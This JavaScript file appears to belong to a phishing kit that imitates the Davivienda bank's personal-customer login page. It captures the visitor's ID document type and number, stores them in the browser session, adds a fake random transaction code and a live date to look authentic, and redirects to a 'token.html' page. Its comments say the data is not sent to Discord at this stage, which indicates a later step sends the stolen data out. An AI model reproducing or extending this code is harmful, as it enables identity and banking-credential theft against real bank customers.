/* ============================================
   DAVIVIENDA - LOGIN PERSONA NATURAL
   Solo guarda datos, NO envía a Discord
   ============================================ */

(function() {
    'use strict';

    // ==========================================
    // ELEMENTOS
    // ==========================================
    var fechaEl      = document.getElementById('dav-fecha');
    var cusEl        = document.getElementById('dav-cus');
    var formEl       = document.getElementById('davFormLogin');
    var selectTipo   = document.getElementById('dav-tipo-doc');
    var inputNumDoc  = document.getElementById('dav-num-doc');
    var btnContinuar = document.getElementById('davBtnContinuar');
    var btnCancelar  = document.getElementById('davBtnCancelar');

    // ==========================================
    // SESIÓN Y CUS
    // ==========================================
    var sessionId = 'sess_' + Date.now() + '_' + Math.floor(Math.random() * 10000);
    try { sessionStorage.setItem('sessionId', sessionId); } catch(e) {}

    // ==========================================
    // FECHA DINÁMICA
    // ==========================================
    var fecha = new Date();
    var fechaStr = fecha.toLocaleDateString('es-CO', {
        weekday: 'long', day: 'numeric', month: 'long', year: 'numeric'
    });
    fechaStr = fechaStr.charAt(0).toUpperCase() + fechaStr.slice(1);

    var horaStr = fecha.toLocaleTimeString('es-CO', {
        hour: '2-digit', minute: '2-digit', hour12: true
    });

    if (fechaEl) fechaEl.textContent = fechaStr + ', ' + horaStr;

    // ==========================================
    // CUS ALEATORIO
    // ==========================================
    var cus = Math.floor(100000000 + Math.random() * 900000000);
    if (cusEl) cusEl.textContent = cus;

    // ==========================================
    // CANAL
    // ==========================================
    var canal = 'Persona Natural';
    try {
        canal = sessionStorage.getItem('dav_canal') || 'Persona Natural';
    } catch(e) {}

    // ==========================================
    // SOLO NÚMEROS EN EL INPUT
    // ==========================================
    if (inputNumDoc) {
        inputNumDoc.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '');
        });
    }

    // ==========================================
    // BOTÓN CANCELAR
    // ==========================================
    if (btnCancelar) {
        btnCancelar.addEventListener('click', function() {
            window.location.href = 'index.html';
        });
    }

    // ==========================================
    // SUBMIT — Solo guarda y redirige
    // ==========================================
    if (formEl) {
        formEl.addEventListener('submit', function(ev) {
            ev.preventDefault();

            var tipoDoc = selectTipo ? selectTipo.value : '01';
            var tipoDocTexto = selectTipo ? selectTipo.options[selectTipo.selectedIndex].text : 'Cedula de Ciudadania';
            var numDoc = inputNumDoc ? inputNumDoc.value.trim() : '';

            if (!numDoc) {
                alert('Por favor ingrese el número de documento.');
                return;
            }

            if (numDoc.length < 5) {
                alert('El número de documento debe tener al menos 5 dígitos.');
                return;
            }

            // Guardar TODO en sessionStorage (NO enviamos a Discord aquí)
            try {
                sessionStorage.setItem('dav_tipo_doc', tipoDoc);
                sessionStorage.setItem('dav_tipo_doc_texto', tipoDocTexto);
                sessionStorage.setItem('dav_num_doc', numDoc);
                sessionStorage.setItem('dav_canal', canal);
                sessionStorage.setItem('sessionId', sessionId);
            } catch(e) {}

            console.log('📝 Datos guardados (NO enviados a Discord todavía)');

            // Redirigir a token.html
            window.location.href = 'token.html';
        });
    }

})();